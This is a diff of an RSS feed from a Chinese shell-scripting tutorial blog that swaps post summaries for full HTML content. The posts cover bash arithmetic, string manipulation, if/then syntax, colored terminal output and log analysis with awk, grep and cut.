+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 删除go脚本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -rf go
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上文的脚本中，有许多命令后跟着 &lt;code&gt;--&lt;/code&gt;  和 &lt;code&gt;-&lt;/code&gt;  这两个参数都是 bash 脚本的内置参数，用来标记命令的内置参数已经结束。&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>shell数学运算</title>
       <link>https://wdd.js.org/shell/match-eval/</link>
       <pubDate>Sat, 26 Oct 2019 14:18:08 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/match-eval/</guid>
-      <description>主要的数据运算方式
-let (()) [] expr bc 使用 let 使用 let 时，等号右边的变量不需要在加上$符号
-#!/bin/bash no1=1; no2=2; # 注意两个变量的值的类型实际上是字符串 re1=$no1+$no2 # 注意此时re1的值是1+2 let result=no1+no2 # 此时才是想获取的两数字的和，3 </description>
+      <description>&lt;p&gt;主要的数据运算方式&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;let&lt;/li&gt;
+&lt;li&gt;(())&lt;/li&gt;
+&lt;li&gt;[]&lt;/li&gt;
+&lt;li&gt;expr&lt;/li&gt;
+&lt;li&gt;bc&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;使用-let&#34;&gt;使用 let&lt;/h1&gt;
+&lt;p&gt;使用 let 时，等号右边的变量不需要在加上$符号&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/bash
+
+no1=1;
+no2=2;
+# 注意两个变量的值的类型实际上是字符串
+re1=$no1+$no2 # 注意此时re1的值是1+2
+let result=no1+no2 # 此时才是想获取的两数字的和，3
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
-    
     <item>
       <title>字符串操作</title>
       <link>https://wdd.js.org/shell/string-operator/</link>
       <pubDate>Sat, 26 Oct 2019 14:16:28 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/string-operator/</guid>
-      <description>获取字符串长度 需要在变量前加个**#**
-name=wdd echo ${#name} 首尾去空格 echo &amp;#34; abcd &amp;#34; | xargs 字符串包含 # $var是否包含字符串A if [[ $var =~ &amp;#34;A&amp;#34; ]]; then echo fi # $var是否以字符串A开头 if [[ $var =~ &amp;#34;^A&amp;#34; ]]; then echo fi # $var是否以字符串A结尾 if [[ $var =~ &amp;#34;A$&amp;#34; ]]; then echo fi 字符串提取 #!/bin/bash num1=${test#*_} num2=${num1#*_} surname=${num2%_*} num4=${test##*_} profession=${num4%.*} #*_ 从左边开始，去第一个符号“_”左边的所有字符 % _* 从右边开始，去掉第一个符号“_”右边的所有字符 ##*_ 从右边开始，去掉第一个符号“_”左边的所有字符 %%_* 从左边开始，去掉第一个符号“_”右边的所有字符 判断某个字符串是否以特定字符开头 if [[ $TAG =~ ABC* ]]; then echo $TAG is begin with ABC fi </description>
+      <description>&lt;h1 id=&#34;获取字符串长度&#34;&gt;获取字符串长度&lt;/h1&gt;
+&lt;p&gt;需要在变量前加个**#**&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;name=wdd
+echo ${#name}
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;首尾去空格&#34;&gt;首尾去空格&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; abcd &amp;#34;&lt;/span&gt; | xargs
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;字符串包含&#34;&gt;字符串包含&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $var是否包含字符串A&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $var是否以字符串A开头&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $var是否以字符串A结尾&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;字符串提取&#34;&gt;字符串提取&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;num1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;test#*_&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;num2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;num1#*_&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;surname&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;num2%_*&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;num4&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;test##*_&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;profession&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;num4%.*&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#*_ 从左边开始，去第一个符号“_”左边的所有字符&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;% _* 从右边开始，去掉第一个符号“_”右边的所有字符
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;##*_ 从右边开始，去掉第一个符号“_”左边的所有字符&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%%_* 从左边开始，去掉第一个符号“_”右边的所有字符
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;判断某个字符串是否以特定字符开头&#34;&gt;判断某个字符串是否以特定字符开头&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $TAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ ABC* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo $TAG is begin with ABC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
-    
     <item>
       <title>流程控制</title>
       <link>https://wdd.js.org/shell/flow-control/</link>
       <pubDate>Fri, 18 Oct 2019 13:06:58 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/flow-control/</guid>
-      <description>if then // good if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // good if [ -d public ]; then echo &amp;#34;public exist&amp;#34; if // error: if和then写成一行时，条件后必须加上分号 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // error: shell对空格比较敏感，多个空格和少个空格，执行的含义完全不同 // 在[]中，内侧前后都需要加上空格 if [-d public] then echo &amp;#34;public exist&amp;#34; if if elif then if [ -d public ] then echo &amp;#34;public exist&amp;#34; elif then 循环 switch 常用例子 判断目录是否存在 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if 判断文件是否存在 </description>
+      <description>&lt;h1 id=&#34;if-then&#34;&gt;if then&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// good
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// good
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// error: if和then写成一行时，条件后必须加上分号
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// error: shell对空格比较敏感，多个空格和少个空格，执行的含义完全不同
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 在&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;中，内侧前后都需要加上空格
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-d public&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;if-elif-then&#34;&gt;if elif then&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;循环&#34;&gt;循环&lt;/h1&gt;
+&lt;h1 id=&#34;switch&#34;&gt;switch&lt;/h1&gt;
+&lt;h1 id=&#34;常用例子&#34;&gt;常用例子&lt;/h1&gt;
+&lt;h2 id=&#34;判断目录是否存在&#34;&gt;判断目录是否存在&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;判断文件是否存在&#34;&gt;判断文件是否存在&lt;/h2&gt;</description>
     </item>
-    
     <item>
       <title>彩色文本与彩色背景打印</title>
       <link>https://wdd.js.org/shell/colorful-print/</link>
       <pubDate>Wed, 16 Oct 2019 13:57:29 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/colorful-print/</guid>
-      <description>打印彩色字体 0 重置 30 黑色 31 红色 32 绿色 33 黄色 34 蓝色 35 洋红 36 青色 37 白色 把 31 改成其他数字，就可打印其他颜色的 this 了。大部分情况下，我们只需要记住红色和绿色就可以了
-echo -e &amp;#34;\e[1;31m this \e[0m whang&amp;#34; 打印彩色背景 0 重置 40 黑色 41 红色 42 绿色 43 黄色 44 蓝色 45 洋红 46 青色 47 白色 echo -e &amp;#34;\e[1;45m this \e[0m whang&amp;#34; </description>
+      <description>&lt;h1 id=&#34;打印彩色字体&#34;&gt;打印彩色字体&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;0 重置&lt;/li&gt;
+&lt;li&gt;30 黑色&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;31 红色&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;32 绿色&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;33 黄色&lt;/li&gt;
+&lt;li&gt;34 蓝色&lt;/li&gt;
+&lt;li&gt;35 洋红&lt;/li&gt;
+&lt;li&gt;36 青色&lt;/li&gt;
+&lt;li&gt;37 白色&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;把 31 改成其他数字，就可打印其他颜色的 this 了。大部分情况下，我们只需要记住红色和绿色就可以了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\e[1;31m this \e[0m whang&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;打印彩色背景&#34;&gt;打印彩色背景&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;0 重置&lt;/li&gt;
+&lt;li&gt;40 黑色&lt;/li&gt;
+&lt;li&gt;41 红色&lt;/li&gt;
+&lt;li&gt;42 绿色&lt;/li&gt;
+&lt;li&gt;43 黄色&lt;/li&gt;
+&lt;li&gt;44 蓝色&lt;/li&gt;
+&lt;li&gt;45 洋红&lt;/li&gt;
+&lt;li&gt;46 青色&lt;/li&gt;
+&lt;li&gt;47 白色&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\e[1;45m this \e[0m whang&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
-    
     <item>
       <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
       <link>https://wdd.js.org/shell/grep-awk-sort/</link>
       <pubDate>Tue, 15 Oct 2019 21:35:15 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/grep-awk-sort/</guid>
-      <description>test.log
-2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列
-日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。
-比如输出日志的第三列
-awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取 cause 字段的原因值？
-2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用 grep 的正则提取。</description>
+      <description>&lt;p&gt;test.log&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;按列分割&#34;&gt;按列分割&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;提取第三列&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。&lt;/p&gt;
+&lt;p&gt;比如输出日志的第三列&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列
+cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;正则提取&#34;&gt;正则提取&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;提取 cause 字段的原因值？&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34;
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取&lt;/code&gt;。最好用的方式是用 grep 的正则提取。&lt;/p&gt;
+&lt;p&gt;好像 grep 不支持捕获分组，所以只能提取出出 cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出 AAA&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>Docker镜像批量清理脚本</title>
       <link>https://wdd.js.org/shell/docker-clean-tips/</link>
       <pubDate>Tue, 06 Aug 2019 13:48:13 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/docker-clean-tips/</guid>
-      <description>使用 jenkins 作为打包的工具，主机上的磁盘空间总是被慢慢被占满，直到 jenkins 无法运行。本文从几个方面来清理 docker 垃圾。
